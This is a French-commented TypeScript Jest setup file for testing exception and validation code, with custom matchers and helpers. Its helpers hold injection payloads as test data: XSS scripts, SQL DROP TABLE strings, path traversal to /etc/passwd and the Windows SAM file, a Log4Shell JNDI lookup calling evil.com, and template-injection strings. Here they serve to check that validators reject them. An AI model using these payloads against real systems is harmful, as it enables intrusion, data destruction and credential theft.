import 'reflect-metadata';

/**
 * Configuration de test spécifique pour les exceptions et utilitaires
 *
 * Ce fichier configure l'environnement de test pour les composants
 * d'exceptions et de validation qui ne nécessitent pas de base de données
 * ou de services externes.
 */

// Configuration des timeouts pour les tests
jest.setTimeout(10000);

// Configuration des variables d'environnement pour les tests
process.env.NODE_ENV = 'test';
process.env.LOG_LEVEL = 'error'; // Réduire les logs pendant les tests

// Pas de variables de base de données nécessaires pour ces tests
// Les tests d'exceptions et utilitaires sont purement en mémoire

// Mock console methods pour éviter la pollution des logs de test
const originalConsoleError = console.error;
const originalConsoleWarn = console.warn;
const originalConsoleLog = console.log;

beforeAll(() => {
  // Capturer les erreurs importantes mais ignorer les warnings de test
  console.error = jest.fn((message, ...args) => {
    // Laisser passer les vraies erreurs importantes
    if (typeof message === 'string' && message.includes('FATAL')) {
      originalConsoleError(message, ...args);
    }
  });

  console.warn = jest.fn();
  console.log = jest.fn();
});

afterAll(() => {
  // Restaurer les console methods originaux
  console.error = originalConsoleError;
  console.warn = originalConsoleWarn;
  console.log = originalConsoleLog;
});

// Configuration globale des matchers Jest
beforeEach(() => {
  // Reset des timers pour les tests qui utilisent des timestamps
  jest.useFakeTimers();
});

afterEach(() => {
  // Nettoyage après chaque test
  jest.useRealTimers();
  jest.clearAllMocks();
  jest.restoreAllMocks();
});

// Matchers personnalisés pour les tests d'exceptions
expect.extend({
  /**
   * Vérifie qu'une exception a les propriétés d'audit attendues
   */
  toHaveAuditProperties(received: any, expectedProps: string[]) {
    const pass = expectedProps.every(
      (prop) => received && typeof received === 'object' && prop in received,
    );

    if (pass) {
      return {
        message: () =>
          `Expected exception not to have audit properties ${expectedProps.join(', ')}`,
        pass: true,
      };
    } else {
      const missingProps = expectedProps.filter((prop) => !(prop in received));
      return {
        message: () =>
          `Expected exception to have audit properties: ${missingProps.join(', ')}`,
        pass: false,
      };
    }
  },

  /**
   * Vérifie qu'une validation retourne le bon format de résultat
   */
  toBeValidationResult(received: any) {
    const hasRequiredProps =
      received &&
      typeof received === 'object' &&
      typeof received.isValid === 'boolean' &&
      Array.isArray(received.errors);

    if (hasRequiredProps) {
      return {
        message: () => `Expected not to be a validation result`,
        pass: true,
      };
    } else {
      return {
        message: () =>
          `Expected to be a validation result with isValid (boolean) and errors (array)`,
        pass: false,
      };
    }
  },

  /**
   * Vérifie qu'une exception hérite correctement de la classe parente
   */
  toInheritFrom(received: any, expectedParent: any) {
    const pass = received instanceof expectedParent;

    if (pass) {
      return {
        message: () =>
          `Expected exception not to inherit from ${expectedParent.name}`,
        pass: true,
      };
    } else {
      return {
        message: () =>
          `Expected exception to inherit from ${expectedParent.name}`,
        pass: false,
      };
    }
  },

  /**
   * Vérifie qu'un message ne contient pas d'informations sensibles
   */
  toNotContainSensitiveInfo(received: string, sensitiveTerms: string[]) {
    const containsSensitive = sensitiveTerms.some(
      (term) => received && received.toLowerCase().includes(term.toLowerCase()),
    );

    if (!containsSensitive) {
      return {
        message: () => `Expected message to contain sensitive information`,
        pass: true,
      };
    } else {
      const foundTerms = sensitiveTerms.filter((term) =>
        received.toLowerCase().includes(term.toLowerCase()),
      );
      return {
        message: () =>
          `Expected message not to contain sensitive terms: ${foundTerms.join(', ')}`,
        pass: false,
      };
    }
  },
});

// Déclaration des types pour les matchers personnalisés
declare global {
  namespace jest {
    interface Matchers<R> {
      toHaveAuditProperties(expectedProps: string[]): R;
      toBeValidationResult(): R;
      toInheritFrom(expectedParent: any): R;
      toNotContainSensitiveInfo(sensitiveTerms: string[]): R;
    }
  }
}

// Helpers de test réutilisables
export class TestHelpers {
  /**
   * Génère un UUID valide pour les tests
   */
  static generateValidUUID(): string {
    return '123e4567-e89b-12d3-a456-426614174000';
  }

  /**
   * Génère un ID de fichier valide pour les tests
   */
  static generateValidFileId(): string {
    return 'test_file_12345678';
  }

  /**
   * Génère un nom de projet valide pour les tests
   */
  static generateValidProjectName(): string {
    return 'Test Project Name';
  }

  /**
   * Génère une description valide pour les tests
   */
  static generateValidDescription(): string {
    return 'This is a valid test description for testing purposes.';
  }

  /**
   * Génère un prompt valide pour les tests
   */
  static generateValidPrompt(): string {
    return 'Create a comprehensive web application with authentication, user management, and data visualization features.';
  }

  /**
   * Génère des données de test invalides pour différents cas
   */
  static generateInvalidData() {
    return {
      emptyString: '',
      whitespaceString: '   ',
      nullValue: null,
      undefinedValue: undefined,
      numberValue: 123,
      objectValue: {},
      arrayValue: [],
      booleanValue: true,
      tooLongString: 'a'.repeat(10000),
      maliciousString: '<script>alert("xss")</script>',
      sqlInjection: "'; DROP TABLE users; --",
      pathTraversal: '../../../etc/passwd',
    };
  }

  /**
   * Vérifie que les propriétés readonly ne peuvent pas être modifiées
   */
  static testReadonlyProperties(instance: any, properties: string[]): void {
    properties.forEach((prop) => {
      const originalValue = instance[prop];

      // Tentative de modification (devrait être ignorée en readonly)
      try {
        instance[prop] = 'modified_value';
      } catch (error) {
        // C'est normal que ça lance une erreur en strict mode
      }

      // La valeur ne devrait pas avoir changé
      expect(instance[prop]).toBe(originalValue);
    });
  }

  /**
   * Teste la sérialisation JSON d'un objet
   */
  static testJSONSerialization(instance: any): void {
    expect(() => JSON.stringify(instance)).not.toThrow();

    const serialized = JSON.stringify(instance);
    expect(serialized).toBeDefined();
    expect(serialized.length).toBeGreaterThan(0);

    const parsed = JSON.parse(serialized);
    expect(parsed).toBeDefined();
    expect(typeof parsed).toBe('object');
  }

  /**
   * Teste la performance d'une fonction avec des données volumineuses
   */
  static testPerformance(
    fn: Function,
    args: any[],
    expectedMaxTime: number = 100,
  ): void {
    const start = Date.now();
    fn(...args);
    const duration = Date.now() - start;

    expect(duration).toBeLessThan(expectedMaxTime);
  }

  /**
   * Génère des données de test Unicode
   */
  static generateUnicodeTestData(): string[] {
    return [
      'Français avec accénts éèà',
      '日本語テスト',
      'Русский текст',
      'العربية',
      '🚀 Emoji test 🎉',
      'Mixed: français 日本語 🌟',
    ];
  }

  /**
   * Teste la résistance aux injections pour une fonction de validation
   */
  static testInjectionResistance(validationFn: Function): void {
    const injectionAttempts = [
      '<script>alert("xss")</script>',
      'javascript:alert(1)',
      'data:text/html,<script>alert(1)</script>',
      '"; DROP TABLE users; --',
      "'; DROP TABLE projects; --",
      '../../../etc/passwd',
      '..\\..\\..\\windows\\system32\\config\\sam',
      '${jndi:ldap://evil.com/a}',
      '{{7*7}}',
      '<%- eval(request.params.id) %>',
    ];

    injectionAttempts.forEach((maliciousInput) => {
      expect(() => validationFn(maliciousInput)).not.toThrow();
      const result = validationFn(maliciousInput);

      // Le résultat ne devrait jamais être valide pour ces entrées
      if (typeof result === 'boolean') {
        expect(result).toBe(false);
      } else if (result && typeof result === 'object' && 'isValid' in result) {
        expect(result.isValid).toBe(false);
      }
    });
  }
}

// Export des helpers pour utilisation dans les tests
export default TestHelpers;
